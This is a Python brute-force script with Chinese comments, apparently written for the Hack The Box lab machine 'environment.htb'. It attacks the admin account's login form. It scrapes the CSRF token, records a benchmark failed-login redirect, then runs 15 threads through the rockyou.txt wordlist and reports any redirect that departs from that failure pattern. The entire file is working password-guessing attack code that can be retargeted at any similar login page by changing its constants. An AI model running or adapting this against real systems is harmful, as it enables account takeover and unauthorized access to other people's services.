# 导入必要的库
import requests  # 用于发送HTTP请求
from bs4 import BeautifulSoup  # 用于解析HTML
from concurrent.futures import ThreadPoolExecutor  # 用于多线程
import threading  # 线程相关操作
import os  # 操作系统相关功能
import time  # 时间相关操作

# --- 配置部分 ---
LOGIN_PAGE_URL = "http://environment.htb/login"  # 登录页面URL
POST_URL = "http://environment.htb/login"  # 提交登录表单的URL
TARGET_EMAIL = "admin@environment.htb"  # 目标邮箱账号
WORDLIST_PATH = os.path.join(os.path.dirname(__file__), "rockyou.txt")  # 密码字典路径
MAX_WORKERS = 15  # 最大线程数
BENCHMARK_PASSWORD = "THIS_IS_A_VERY_UNIQUE_AND_UNLIKELY_PASSWORD_123!@#$"  # 用于基准测试的错误密码
# ---

found_event = threading.Event()  # 线程事件，用于标记是否找到密码
session = requests.Session()  # 创建会话对象，保持cookies

def get_csrf_token(login_page_url):
    """获取登录页面的CSRF令牌"""
    try:
        # 发送GET请求获取登录页面
        response = session.get(login_page_url, timeout=10)
        response.raise_for_status()  # 检查请求是否成功
        
        # 使用BeautifulSoup解析HTML
        soup = BeautifulSoup(response.text, 'html.parser')
        
        # 尝试从input标签获取CSRF令牌
        token_input = soup.find('input', {'name': '_token'})
        if token_input and token_input.get('value'):
            return token_input['value']
        
        # 尝试从meta标签获取CSRF令牌
        meta_token = soup.find('meta', {'name': 'csrf-token'})
        if meta_token and meta_token.get('content'):
            return meta_token['content']

        print("CSRF token not found in HTML inputs or meta tags.")
        return None
    except requests.RequestException as e:
        print(f"Error fetching CSRF token: {e}")
        return None

def try_password_bruteforce(args):
    """尝试使用密码进行暴力破解"""
    email, password, csrf_token, benchmark_failure_location = args
    if found_event.is_set():  # 如果已经找到密码则直接返回
        return

    password = password.strip()  # 去除密码两端的空白字符
    
    if not csrf_token:  # 如果没有CSRF令牌则跳过
        print(f"Skipping password '{password}' for {email} due to missing CSRF token.")
        return

    # 构造POST数据
    payload = {
        "_token": csrf_token,
        "email": email,
        "password": password,
        "remember": "False",
    }
    
    start_time = time.time()  # 记录开始时间
    try:
        # 发送POST请求尝试登录
        response = session.post(POST_URL, data=payload, timeout=10, allow_redirects=False)
        end_time = time.time()  # 记录结束时间
        duration = end_time - start_time  # 计算请求耗时
        current_location = response.headers.get('Location')  # 获取重定向位置

        # 打印尝试信息
        print(f"Trying: {email} / '{password}' - Status: {response.status_code} - Time: {duration:.4f}s - Location: {current_location}")

        # 标准成功检查（主要检查点）
        if response.status_code in [301, 302, 303, 307, 308] and current_location:
            # 检查是否不是登录页面且没有错误信息
            if LOGIN_PAGE_URL not in current_location and \
               ("error=" not in current_location.lower()) and \
               ("/login" not in current_location.lower()):
                print(f"--- PASSWORD POSSIBLY FOUND (Standard Check)! ---")
                print(f"Email: {email}")
                print(f"Password: {password}")
                print(f"Status Code: {response.status_code}")
                print(f"Redirect Location: {current_location}")
                print(f"Response Text (first 100 chars): {response.text[:100]}")
                found_event.set()  # 设置事件标志
                return
            
            # 额外检查：如果重定向位置与基准失败位置不同
            if benchmark_failure_location and current_location != benchmark_failure_location:
                print(f"--- ANOMALOUS RESPONSE DETECTED (Different from benchmark failure)! ---")
                print(f"Email: {email}")
                print(f"Password: {password}")
                print(f"Status Code: {response.status_code}")
                print(f"Redirect Location: {current_location}")
                print(f"Benchmark Failure Location was: {benchmark_failure_location}")
                print(f"Response Text (first 100 chars): {response.text[:100]}")

    except requests.RequestException as e:
        pass  # 忽略请求异常

def main():
    """主函数"""
    print(f"Starting password bruteforce for: {TARGET_EMAIL}")

    # 获取初始CSRF令牌
    print("Attempting to get initial CSRF token...")
    initial_csrf_token = get_csrf_token(LOGIN_PAGE_URL)
    if not initial_csrf_token:
        print("Could not get initial CSRF token. Aborting bruteforce.")
        return
    print(f"Using initial CSRF token: {initial_csrf_token}")

    # --- 获取基准失败响应 ---
    benchmark_failure_location = None
    print(f"Sending benchmark request with password: '{BENCHMARK_PASSWORD}' to establish failure pattern...")
    payload_benchmark = {
        "_token": initial_csrf_token,
        "email": TARGET_EMAIL,
        "password": BENCHMARK_PASSWORD,
        "remember": "False",
    }
    try:
        # 发送基准测试请求
        benchmark_response = session.post(POST_URL, data=payload_benchmark, timeout=10, allow_redirects=False)
        if benchmark_response.status_code in [301, 302, 303, 307, 308]:
            benchmark_failure_location = benchmark_response.headers.get('Location')
            print(f"Benchmark failure established: Status {benchmark_response.status_code}, Location: {benchmark_failure_location}")
        else:
            print(f"Benchmark request did not result in a redirect. Status: {benchmark_response.status_code}, Text: {benchmark_response.text[:100]}")
    except requests.RequestException as e:
        print(f"Error during benchmark request: {e}")
    # ---

    # 加载密码字典
    try:
        with open(WORDLIST_PATH, "r", encoding="latin-1") as f:
            passwords = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"Error: Wordlist not found at {WORDLIST_PATH}")
        return

    if not passwords:
        print("Wordlist is empty.")
        return
    
    print(f"Loaded {len(passwords)} passwords from wordlist.")

    # 准备任务列表
    tasks = []
    for password in passwords:
        tasks.append((TARGET_EMAIL, password, initial_csrf_token, benchmark_failure_location))

    print(f"Starting bruteforce with {MAX_WORKERS} workers...")
    
    # 使用线程池执行暴力破解
    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
        executor.map(try_password_bruteforce, tasks)

    # 输出最终结果
    if found_event.is_set():
        print("\nBruteforce finished. A password was likely found (see details above).")
    else:
        print("\nBruteforce finished. No password found for the user with the current wordlist (based on standard check).")
        print("Review any 'ANOMALOUS RESPONSE DETECTED' messages above for potential leads.")

if __name__ == "__main__":
    main()  # 程序入口